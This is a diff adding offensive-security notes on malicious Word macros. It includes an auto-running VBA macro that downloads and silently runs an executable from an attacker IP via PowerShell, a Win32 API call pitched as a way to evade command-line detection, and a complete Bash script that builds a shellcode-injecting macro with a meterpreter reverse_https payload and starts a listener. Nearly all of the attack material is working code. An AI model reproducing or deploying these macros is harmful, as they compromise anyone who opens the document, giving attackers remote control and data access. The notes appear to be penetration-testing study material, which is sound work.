@@ -117,3 +117,177 @@ Sub MyMacro()
     CreateObject("Wscript.Shell").Run str, 0
 End Sub
 ```
+
+## Executing PowerShell
+
+We can also use VBA scripts to execute PowerShell to download payloads from a
+stager. Here's an example using **System.Net.WebClient** to download and
+execute a file after gaining macro execution in a Word document:
+
+```vba
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
+    Shell str, vbHide
+    Dim exePath As String
+    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
+    Wait (2)
+    Shell exePath, vbHide
+
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
+```
+
+We can also use other PowerShell methods available like **Invoke-WebRequest**.
+
+## Calling Win32API
+
+We can import `.dll`s that implement **Win32API** functions directly from VBA
+and execute them within macros. This enables us to execute unmanaged code
+within the macro - a great way to bypass detection of funky `cmd.exe` and
+`powershell.exe` command execution.
+
+The example provided below shows how to import the `GetUserNameA` **Win32API**
+function from `advapi32.dll` in a macro. We use the `Private Declare` keywords
+to declare a private function. We use the `PtrSafe` keyword for 64-bit targets.
+`String` variables are already handled as pointer values in VBA, so we can pass
+these by value to the `GetUserNameA` function.
+
+```vba
+'Win32API GetUserNameA function definition
+'BOOL GetUserNameA(
+'  LPSTR   lpBuffer,
+'  LPDWORD pcbBuffer
+');
+
+'Declare the function using advapi32.dll
+Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
+
+Function MyMacro()
+  Dim res As Long
+  Dim MyBuff As String * 256
+  Dim MySize As Long
+  Dim strlen As Long
+  MySize = 256
+
+  res = GetUserName(MyBuff, MySize)
+  strlen = InStr(1, MyBuff, vbNullChar) - 1
+  MsgBox Left$(MyBuff, strlen)
+End Function
+```
+
+In the above macro, we use the `InStr` function to find the first `NULL` byte,
+which will be at the end of the buffer, `MyBuff`, containing the username
+retrieved from the `GetUserNameA` call. Subtracting 1 from that value will
+provide us with the true length of the username.
+
+Using the `Left` method, we provide the `strlen` parameter to create a
+substring, essentially conducting a `MyBuff[:strlen]` operation to only print
+the contents of `MyBuff` up to `strlen`.
+
+### Executing shellcode
+
+The following **Bash** script generates a VBA macro payload that embeds
+shellcode for a `msfvenom` `windows/x64/meterpreter/reverse_https` payload. The
+VBA macro will execute the provided shellcode by calling `VirtualAlloc`,
+`RtlMoveMemory`, and `CreateThread` from `kernel32.dll`. The shellcode buffer
+gets copied, byte by byte, into the new memory segment in the current process.
+After successfully movement of the shellcode, `CreateThread` is execute to gain
+code execution. Understanding the parameters passed to each **Win32API** call
+is an exercise left for the reader.
+
+```bash
+#!/bin/bash
+
+set -ex -o pipefail
+
+MSFPAYLOAD="windows/x64/meterpreter/reverse_https"
+MSFCONSOLE=$(which msfconsole)
+MSFVENOM=$(which msfvenom)
+
+
+msfvenom() {
+    PAYLOAD=$($MSFVENOM \
+		-p $MSFPAYLOAD \
+		LHOST=$LHOST \
+		LPORT=$LPORT \
+		EXITFUNC=thread \
+        -f vbapplication 2>/dev/null)
+}
+
+
+generate_payload() {
+    tee payload.vba << EOF
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Function MyMacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As LongPtr
+
+	$PAYLOAD
+
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+EOF
+}
+
+listen() {
+    $MSFCONSOLE \
+        -q \
+        -x "use multi/handler; \
+            set payload $MSFPAYLOAD; \
+            set LHOST $LHOST; \
+            set LPORT $LPORT; \
+            exploit"
+}
+
+
+LHOST=$1
+LPORT=$2
+
+msfvenom
+generate_payload
+listen
+```
+
+After successful execution of the generated macro payload in a Word document,
+the `msfconsole` listener process will receive a reverse callback from the
+victim, upload the stager payload, and establish a `meterpreter` session with
+the victim host.
